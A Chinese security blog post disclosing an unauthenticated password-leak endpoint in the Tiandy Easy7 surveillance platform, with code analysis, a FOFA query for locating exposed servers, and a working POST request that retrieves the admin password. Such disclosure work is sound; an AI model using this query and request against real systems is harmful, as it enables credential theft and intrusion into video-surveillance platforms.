---
title: "天地伟业Easy7 queryPassword 信息泄露漏洞"
source: https://mrxn.net/jswz/easy7-user-queryPassword-data-leak.html
asset_dir: assets/天地伟业easy7-querypassword-信息泄露漏洞
---

# 天地伟业Easy7 queryPassword 信息泄露漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/2/8 08:55
* 319浏览
* [0评论](#comment)
* 15分钟阅读

深入探索

REST

rest

数据库


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

天地伟业Easy7是一款用于视频监控管理的软件系统。

漏洞预警服务

该系统中存在一个[信息泄露](https://mrxn.net/tag/%E6%B3%84%E9%9C%B2)漏洞，攻击者可以通过访问特定的URL路径/Easy7/rest/user/queryPassword获取系统用户信息。攻击者可通过构造特定请求读取系统登录密码。

# 影响版本

# fofa语法

> body="/Easy7/apps/WebService/LogIn.jsp" || body="Easy7/VideoLib.EXE" || body="/Easy7/index.html" || (body="<img src=\"./images/ico/Easy7\_logo\_transparent.png") && title="平台"

# 漏洞分析

首先，该系统基于Spring 3.0，比较古老且WEB-INF/web.xml里没有配置任何filter进行权限校验，因此绝大部分接口都是可以直接访问的。

物流软件安全

再来看本次的[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)接口 `/rest/user/queryPassword` 实现逻辑

```
@Controller
@RequestMapping({"/user"})
public class CLS_REST_User {
    @Resource(
        name = "boUser"
    )
    private CLS_BO_User boUser;

    @RequestMapping({"/queryPassword"})
    public void queryPassword(HttpServletRequest req, HttpServletResponse resp, String userName) throws Exception {
        resp.getWriter().print(JSONObject.fromObject(this.boUser.queryPassword(userName)));
    }
```

跟进`queryPassword`方法

```
@Transactional
public CLS_VO_Result queryPassword(String userName) {
    CLS_VO_Result result = new CLS_VO_Result();
    if (null != userName && !"".equals(userName)) {
        result.setContent(this.daoUser.getUserInfoByUsername(userName).getSPassword());
        result.setRet(0);
        return result;
    } else {
        result.setRet(-7);
        return result;
    }
}
```

继续跟进`getUserInfoByUsername`方法看下

[![天地伟业Easy7 queryPassword 信息泄露漏洞](images/img-001-32ffd763db99.webp)](https://image.mrxn.net/06e261d56245480faf100781dc6bbcac.webp)

直接将用户传递过来的参数userName带入数据库查询并返回查询到的密码信息。

计算机科学

# 漏洞复现

```
POST /Easy7/rest/user/queryPassword HTTP/1.1
Host: easy7.mrxn.net
Content-Type: application/x-www-form-urlencoded

userName=admin
```

[![天地伟业Easy7 queryPassword 信息泄露漏洞](images/img-002-7729f763d0ec.webp)](https://image.mrxn.net/4b4279bb9bbc47daa5bc509f7fd07553.webp)

部分版本密码是明文

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#泄露](https://mrxn.net/tag/%E6%B3%84%E9%9C%B2)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[天地伟业Easy7 queryPassword 信息泄露漏洞](https://mrxn.net/jswz/easy7-user-queryPassword-data-leak.html)  
文章链接：<https://mrxn.net/jswz/easy7-user-queryPassword-data-leak.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

漏洞预警服务

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/easy7-user-queryPassword-data-leak.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

安全工具开发

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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